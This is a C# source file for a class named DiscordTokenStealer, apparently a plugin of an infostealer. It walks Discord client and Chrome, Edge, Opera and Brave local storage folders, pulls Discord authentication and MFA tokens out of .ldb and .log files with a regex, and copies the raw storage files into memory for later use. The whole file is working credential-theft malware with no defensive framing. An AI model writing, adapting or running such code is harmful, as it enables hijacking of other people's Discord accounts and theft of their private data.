using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace Plugin.Messaging
{
    public class DiscordTokenStealer
    {
        private static readonly string[] DiscordPaths = new string[]
        {
            "%APPDATA%\\discord\\Local Storage\\leveldb",
            "%APPDATA%\\discordcanary\\Local Storage\\leveldb",
            "%APPDATA%\\discordptb\\Local Storage\\leveldb",
            "%APPDATA%\\discorddevelopment\\Local Storage\\leveldb",
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            "%APPDATA%\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
            "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"
        };
        
        private static readonly Regex TokenRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", RegexOptions.Compiled);
        
        public static List<string> ExtractTokens()
        {
            List<string> tokens = new List<string>();
            HashSet<string> uniqueTokens = new HashSet<string>();
            
            foreach (string path in DiscordPaths)
            {
                try
                {
                    string expandedPath = Environment.ExpandEnvironmentVariables(path);
                    
                    if (!Directory.Exists(expandedPath))
                        continue;
                    
                    string[] files = Directory.GetFiles(expandedPath, "*.ldb", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in files)
                    {
                        try
                        {
                            string content = File.ReadAllText(file);
                            MatchCollection matches = TokenRegex.Matches(content);
                            
                            foreach (Match match in matches)
                            {
                                string token = match.Value;
                                if (uniqueTokens.Add(token))
                                {
                                    tokens.Add(token);
                                }
                            }
                        }
                        catch { }
                    }
                    
                    // Also check log files
                    files = Directory.GetFiles(expandedPath, "*.log", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in files)
                    {
                        try
                        {
                            string content = File.ReadAllText(file);
                            MatchCollection matches = TokenRegex.Matches(content);
                            
                            foreach (Match match in matches)
                            {
                                string token = match.Value;
                                if (uniqueTokens.Add(token))
                                {
                                    tokens.Add(token);
                                }
                            }
                        }
                        catch { }
                    }
                }
                catch { }
            }
            
            return tokens;
        }
        
        public static Dictionary<string, byte[]> StealDiscordFiles()
        {
            Dictionary<string, byte[]> files = new Dictionary<string, byte[]>();
            
            foreach (string path in DiscordPaths)
            {
                try
                {
                    string expandedPath = Environment.ExpandEnvironmentVariables(path);
                    
                    if (!Directory.Exists(expandedPath))
                        continue;
                    
                    string[] levelDbFiles = Directory.GetFiles(expandedPath, "*.*", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in levelDbFiles)
                    {
                        try
                        {
                            string fileName = Path.GetFileName(file);
                            string pathName = path.Replace("%APPDATA%\\", "").Replace("%LOCALAPPDATA%\\", "").Replace("\\", "_");
                            
                            byte[] fileData = File.ReadAllBytes(file);
                            files[$"Discord_{pathName}_{fileName}"] = fileData;
                        }
                        catch { }
                    }
                }
                catch { }
            }
            
            return files;
        }
    }
}
